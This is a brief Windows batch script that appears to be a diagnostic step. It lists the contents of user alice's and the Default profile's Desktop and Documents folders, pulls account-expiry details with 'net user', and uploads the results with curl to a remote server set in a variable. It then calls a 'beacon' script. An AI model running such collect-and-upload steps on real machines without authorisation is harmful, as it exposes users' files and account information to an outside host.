@echo off
call C:\pdt\id.cmd
set T=C:\pdt\d3.txt
> %T% echo === dir C:\pdt
dir /b C:\pdt >> %T%
>> %T% echo === alice profile
dir /b C:\Users\alice\Desktop C:\Users\alice\Documents >> %T% 2>&1
>> %T% echo === Default skel
dir /b C:\Users\Default\Desktop C:\Users\Default\Documents >> %T% 2>&1
>> %T% echo === net user alice
net user alice | find /i "expires" >> %T%
curl.exe -sS -T %T% "%SRV%/uploads/%ID%/%RUN%/diag3.txt" -o nul
call C:\pdt\beacon.cmd diag3 ok
